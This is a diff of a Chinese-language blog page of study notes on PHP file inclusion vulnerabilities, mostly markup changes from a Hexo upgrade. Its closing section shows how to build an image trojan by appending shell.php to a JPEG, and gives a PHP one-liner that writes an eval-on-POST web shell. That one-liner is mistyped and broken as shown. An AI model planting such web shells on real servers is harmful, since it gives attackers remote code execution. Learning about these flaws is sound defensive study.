@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.2.0">
+<meta name="generator" content="Hexo 5.4.0">
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
@@ -210,7 +210,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <section class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-text">什么是文件包含漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-text">PHP文件包含的函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E7%A7%8D%E5%87%BD%E6%95%B0%E7%90%86%E8%A7%A3"><span class="nav-text">1.四种函数理解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%91%E7%94%9F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-text">2.发生文件包含漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E7%A7%8D%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93"><span class="nav-text">3.四种函数总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB"><span class="nav-text">文件包含漏洞分类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-text">1.本地文件包含漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-text">2.远程文件包含漏洞</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="nav-text">文件包含漏洞产生原因</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F"><span class="nav-text">文件包含漏洞渗透</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-text">什么是文件包含漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-text">PHP文件包含的函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E5%9B%9B%E7%A7%8D%E5%87%BD%E6%95%B0%E7%90%86%E8%A7%A3"><span class="nav-text">1.四种函数理解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E5%8F%91%E7%94%9F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-text">2.发生文件包含漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E5%9B%9B%E7%A7%8D%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93"><span class="nav-text">3.四种函数总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB"><span class="nav-text">文件包含漏洞分类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-text">1.本地文件包含漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-text">2.远程文件包含漏洞</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="nav-text">文件包含漏洞产生原因</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F"><span class="nav-text">文件包含漏洞渗透</span></a></li></ol></div>
         </section>
         <!--/noindex-->
 
@@ -354,12 +354,9 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p>　　网络安全内容方面的学习，了解了网站的文件包含漏洞<a id="more"></a></p>
-<h1 id="什么是文件包含漏洞">什么是文件包含漏洞</h1>
-<p>　　php文件包含漏洞的产生原因是在通过php的函数引入文件时，使用了预想之外的文件，就可能导致文件泄露甚至恶意代码的注入。</p>
-<h1 id="php文件包含的函数">PHP文件包含的函数</h1>
-<h2 id="四种函数理解">1.四种函数理解</h2>
-<p>创建inc.php文件</p>
+        <p>　　网络安全内容方面的学习，了解了网站的文件包含漏洞<span id="more"></span></p>
+<h1 id="什么是文件包含漏洞"><a href="#什么是文件包含漏洞" class="headerlink" title="什么是文件包含漏洞"></a>什么是文件包含漏洞</h1><p>　　php文件包含漏洞的产生原因是在通过php的函数引入文件时，使用了预想之外的文件，就可能导致文件泄露甚至恶意代码的注入。</p>
+<h1 id="PHP文件包含的函数"><a href="#PHP文件包含的函数" class="headerlink" title="PHP文件包含的函数"></a>PHP文件包含的函数</h1><h2 id="1-四种函数理解"><a href="#1-四种函数理解" class="headerlink" title="1.四种函数理解"></a>1.四种函数理解</h2><p>创建inc.php文件</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is inc.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>创建include.php文件</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./inc.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;This is include.php!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./inc.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -369,47 +366,40 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;./inc.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;This is require.php!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;./inc.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>创建require_once.php文件，功能和require一样，但是只包含一次</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./inc.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;This is require_once.php!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./inc.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="发生文件包含漏洞">2.发生文件包含漏洞</h2>
-<p>如果将require_once.php文件改为</p>
+<h2 id="2-发生文件包含漏洞"><a href="#2-发生文件包含漏洞" class="headerlink" title="2.发生文件包含漏洞"></a>2.发生文件包含漏洞</h2><p>如果将require_once.php文件改为</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./inc.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;This is require_once.php!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./inc.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<figure>
-<img src="https://s3.ax1x.com/2020/11/19/DK8jQH.jpg" alt="DK8jQH.jpg" /><figcaption aria-hidden="true">DK8jQH.jpg</figcaption>
-</figure>
-<h2 id="四种函数总结">3.四种函数总结</h2>
+<p><img src="https://s3.ax1x.com/2020/11/19/DK8jQH.jpg" alt="DK8jQH.jpg"></p>
+<h2 id="3-四种函数总结"><a href="#3-四种函数总结" class="headerlink" title="3.四种函数总结"></a>3.四种函数总结</h2><div class="table-container">
 <table>
 <thead>
-<tr class="header">
+<tr>
 <th>函数名</th>
 <th></th>
 </tr>
 </thead>
 <tbody>
-<tr class="odd">
+<tr>
 <td>include()</td>
 <td>当使用该函数包含文件时，只有代码执行到includ()函数时才会将文件包含进来，发生错误时给出一个警告，继续向下执行</td>
 </tr>
-<tr class="even">
+<tr>
 <td>include_once()</td>
 <td>功能与include()相同，区别在于当重复调用同一文件时，程序只调用一次</td>
 </tr>
-<tr class="odd">
+<tr>
 <td>require()</td>
 <td>require()与include()区别在于require()执行如果发生错误，函数就会输出错误信息，并终止脚本运行</td>
 </tr>
-<tr class="even">
+<tr>
 <td>require_once()</td>
 <td>功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次</td>
 </tr>
 </tbody>
 </table>
-<h1 id="文件包含漏洞分类">文件包含漏洞分类</h1>
-<h2 id="本地文件包含漏洞">1.本地文件包含漏洞</h2>
-<p>当别包含的文件在服务器本地</p>
-<h2 id="远程文件包含漏洞">2.远程文件包含漏洞</h2>
-<p>当被包含的文件在第三方服务器本地</p>
-<h1 id="文件包含漏洞产生原因">文件包含漏洞产生原因</h1>
-<h1 id="文件包含漏洞渗透">文件包含漏洞渗透</h1>
-<p>1.制作一句话图片木马</p>
+</div>
+<h1 id="文件包含漏洞分类"><a href="#文件包含漏洞分类" class="headerlink" title="文件包含漏洞分类"></a>文件包含漏洞分类</h1><h2 id="1-本地文件包含漏洞"><a href="#1-本地文件包含漏洞" class="headerlink" title="1.本地文件包含漏洞"></a>1.本地文件包含漏洞</h2><p>当别包含的文件在服务器本地</p>
+<h2 id="2-远程文件包含漏洞"><a href="#2-远程文件包含漏洞" class="headerlink" title="2.远程文件包含漏洞"></a>2.远程文件包含漏洞</h2><p>当被包含的文件在第三方服务器本地</p>
+<h1 id="文件包含漏洞产生原因"><a href="#文件包含漏洞产生原因" class="headerlink" title="文件包含漏洞产生原因"></a>文件包含漏洞产生原因</h1><h1 id="文件包含漏洞渗透"><a href="#文件包含漏洞渗透" class="headerlink" title="文件包含漏洞渗透"></a>文件包含漏洞渗透</h1><p>1.制作一句话图片木马</p>
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">方法一：windows 命令：</span><br><span class="line"><span class="keyword">copy</span><span class="bash"> hack.jpg/b+shell.php hack.jpg</span></span><br><span class="line"></span><br><span class="line">方法二：使用edjpgcom</span><br></pre></td></tr></table></figure>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>fputs(fopen(<span class="string">&quot;shell2.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&#x27;&lt;?php evla(#_POST[hack]);?&gt;&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>2.上传木马图片文件</p>
